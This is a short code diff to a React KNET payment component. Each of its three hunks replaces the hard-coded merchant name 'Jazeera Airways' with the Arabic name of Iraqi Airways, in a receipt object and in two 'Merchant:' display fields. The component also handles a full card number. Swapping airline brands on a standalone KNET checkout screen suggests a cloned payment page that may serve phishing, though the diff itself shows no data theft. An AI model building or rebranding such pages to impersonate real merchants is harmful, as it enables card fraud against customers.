@@ -301,7 +301,7 @@ export default function KNETPayment() {
       totalPaid: totalAmount,
       cardType: "knet",
       cardLast4: fullCardNumber.slice(-4),
-      serviceName: "Jazeera Airways",
+      serviceName: "الخطوط الجوية العراقية",
       bankName: selectedBank,
       bankLogo: "/kpay/knet.png",
     };
@@ -630,7 +630,7 @@ export default function KNETPayment() {
 
               <div style={fieldRow}>
                 <label style={fieldLabel}>{isAr ? 'التاجر:' : 'Merchant:'}</label>
-                <span style={fieldValue}>Jazeera Airways</span>
+                <span style={fieldValue}>الخطوط الجوية العراقية</span>
               </div>
               <div style={fieldRow}>
                 <label style={fieldLabel}>{isAr ? 'المبلغ:' : 'Amount:'}</label>
@@ -850,7 +850,7 @@ export default function KNETPayment() {
 
               <div style={fieldRow}>
                 <label style={fieldLabel}>{isAr ? 'التاجر:' : 'Merchant:'}</label>
-                <span style={fieldValue}>Jazeera Airways</span>
+                <span style={fieldValue}>الخطوط الجوية العراقية</span>
               </div>
               <div style={fieldRow}>
                 <label style={fieldLabel}>{isAr ? 'المبلغ:' : 'Amount:'}</label>
